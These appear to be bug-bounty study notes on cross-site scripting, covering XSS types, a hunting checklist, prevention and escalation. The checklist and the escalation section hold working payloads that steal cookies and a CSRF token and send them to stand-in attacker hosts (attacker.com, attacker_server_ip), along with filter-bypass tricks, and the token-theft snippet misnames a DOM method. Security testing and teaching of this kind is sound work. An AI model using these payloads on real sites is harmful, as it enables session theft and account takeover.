# Mechanisms and How it works

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.
## Types of XSS
There are three Main kinds of XSS: The difference between these types is in how the XSS payload travels before it gets delivered to the victim user.
- [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting#reflected-cross-site-scripting), where the malicious script comes from the current HTTP request.
- [Stored XSS](https://portswigger.net/web-security/cross-site-scripting#stored-cross-site-scripting), where the malicious script comes from the website's database.
- [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting#dom-based-cross-site-scripting), where the vulnerability exists in client-side code rather than server-side code.

# Hunting for XSS

#### Step 1: Look for Input Opportunities

- look for opportunities to submit user input(comment, user profiles, blog posts, forms, search, and name and username fields in sign-ups)
- even the drop down menus and numeric values are chances (u can edit the value in Burp)
- for reflected and DOM (URL parameters, fragments `#`, or pathnames that get displayed back)
#### Step 2: Insert Payloads

-  Inject different payloads like event handlers`<img src=x onerror=alert('Hunter')>`
- Try different URL scheme `javascript:alert`, `data:text/html,<script>alert('XSS by Vickie')</script>` Try encoding 
- check for user to load an image by using a URL and use it as their profile picture:   `https://example.com/upload_profile_pic?url=IMAGE_URL`
- Take a look at the [XSS cheatsheet]([Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) from PortsWigger.
- Browser use different tags and event handlers, so test by using different browsers 
- Close out previous HTML tags `<img src=""/><script>location="http://attacker.com";</script>">`
- inject special chars and STUDY the response `>'<"//:=;!--`
- use XSS hunter for blind XSS


# Methodology and Testing Checklist

- search for input fields like comments and URL params
- Fuzz parameter using Arjun and param-miner to get hidden params
- inject special chars and STUDY the response `>'<"//:=;!--` and make payload from the ones that worked and didn't get escaped or encoded
- Can you inject into non-changing values (e.g. usernames)?
- the app escaping or deleting the `<Script>`tags?
	- Try event handlers 
	- Try URL scheme `javascript:alert`, `data:text/html,<script>alert('Hunter')
	- Use Recursive tags `<scrip<script>t>location='http://attacker_server_ip/c='+document.cookie;</scrip</script>t>`
	- Try capitalization and encoding
	- Try eval() function
- the App filters the special chars like the single and double quotes?
	- Use the fromCharCode function
	  `<scrIPT>location=String.fromCharCode(104 116 116 112 58 47 47 72 117 110 116 101 114 47 63 99 61)+document.cookie;` to map the ascii to string
-  Try HTTP Parameter Pollution
- look at  [WSTG - v4.2: Testing for XSS](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting) | [Cross-Site Scripting (XSS) Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
# Prevention

For more detailed guides look at [PortSwigger: How to prevent XSS](https://portswigger.net/web-security/cross-site-scripting) | [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- Filter input on arrival
- Encode data on output: encode the output to prevent it from being interpreted as active content
- use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
- Use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur
- escaping especial chars
- use HTML entities function
- sanitize and validate every user input
# Escalating the Attack

Steal CSRF Token of the user and send it to your server as a parameter in the logs

```javascript
var token = document.getElementsById('csrf-token')[0];
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
xhr.send(null)
```

- automatically redirect the victim to malicious pages and perform other harmful operations such as installing malware
- make sure to assess the full impact of that particular XSS to include in your vulnerability report.
# Automating XSS Hunting

If the program you are targeting allows automatic testing, you can use Burp intruder or other fuzzers like wfuzz or FFUF to conduct an automatic XSS scan on your target, 
u can find many payloads for that here  [Cross-Site Scripting (XSS) Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) | [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

# Finding Your First XSS!
1. Look for user input opportunities on the application
2. Insert XSS payloads into the user input fields you’ve found. Insert payloads from lists online, a polyglot payload, or a generic test string
3. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server.
4. If you can’t get any payloads to execute, try bypassing XSS protections.
5. Automate the XSS hunting process
6. Consider the impact of the XSS you’ve found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you’ve found?
# References 

Recommended Writeup: [How I Found Multiple XSS Vulnerabilities Using Unknown Techniques](https://infosecwriteups.com/how-i-found-multiple-xss-vulnerabilities-using-unknown-techniques-74f8e705ea0d)